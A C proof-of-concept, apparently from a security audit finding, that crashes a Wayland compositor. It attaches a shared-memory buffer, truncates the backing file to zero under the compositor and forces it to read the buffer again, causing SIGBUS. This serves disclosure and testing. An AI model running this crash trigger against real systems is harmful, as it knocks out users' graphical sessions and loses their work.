/* F-PR2-02/04 repro: commit an SHM buffer, truncate the pool's backing file
 * under the compositor, force a re-read -> SIGBUS on unmapped pages. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <wayland-client.h>

static struct wl_compositor *compositor;
static struct wl_shm *shm;

static void rm_global(void *d, struct wl_registry *r, uint32_t name,
                       const char *iface, uint32_t ver) {
    if (!strcmp(iface, "wl_compositor"))
        compositor = wl_registry_bind(r, name, &wl_compositor_interface, 4);
    else if (!strcmp(iface, "wl_shm"))
        shm = wl_registry_bind(r, name, &wl_shm_interface, 2);
}
static void rm_global_remove(void *d, struct wl_registry *r, uint32_t n) {}
static const struct wl_registry_listener registry_listener = { rm_global, rm_global_remove };

#define W 64
#define H 64
#define STRIDE (W * 4)
#define SZ (STRIDE * H)

int main(void) {
    struct wl_display *disp = wl_display_connect(NULL);
    if (!disp) { fprintf(stderr, "connect failed\n"); return 1; }
    struct wl_registry *reg = wl_display_get_registry(disp);
    wl_registry_add_listener(reg, &registry_listener, NULL);
    wl_display_roundtrip(disp);
    if (!compositor || !shm) { fprintf(stderr, "bind failed\n"); return 1; }

    char path[] = "/tmp/fpr2-04-XXXXXX";
    int fd = mkstemp(path);
    if (fd < 0) { perror("mkstemp"); return 1; }
    unlink(path);
    if (ftruncate(fd, SZ) != 0) { perror("ftruncate"); return 1; }
    void *map = mmap(NULL, SZ, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }
    memset(map, 0xFF, SZ); /* opaque white pixels */

    struct wl_shm_pool *pool = wl_shm_create_pool(shm, fd, SZ);
    struct wl_buffer *buf = wl_shm_pool_create_buffer(pool, 0, W, H, STRIDE,
                                                       WL_SHM_FORMAT_ARGB8888);
    struct wl_surface *surf = wl_compositor_create_surface(compositor);
    wl_surface_add_listener(surf, &(struct wl_surface_listener){0}, NULL);
    wl_surface_attach(surf, buf, 0, 0);
    wl_surface_damage(surf, 0, 0, W, H);
    wl_surface_commit(surf);
    fprintf(stderr, "first commit flushed\n");
    fflush(stderr);
    wl_display_flush(disp);
    wl_display_roundtrip(disp);

    /* Pull the rug out: truncate the shared backing file under the mapping. */
    if (ftruncate(fd, 0) != 0) { perror("ftruncate-0"); }
    fprintf(stderr, "backing file truncated to 0, re-committing...\n");
    fflush(stderr);

    /* Force the compositor to sample the buffer again. */
    wl_surface_attach(surf, buf, 1, 0);
    wl_surface_damage(surf, 0, 0, W, H);
    wl_surface_commit(surf);
    wl_display_flush(disp);

    int rc = wl_display_roundtrip(disp);
    fprintf(stderr, "roundtrip=%d display_error=%s\n", rc,
            wl_display_get_error(disp) ? "yes" : "no");
    close(fd);
    return 0;
}
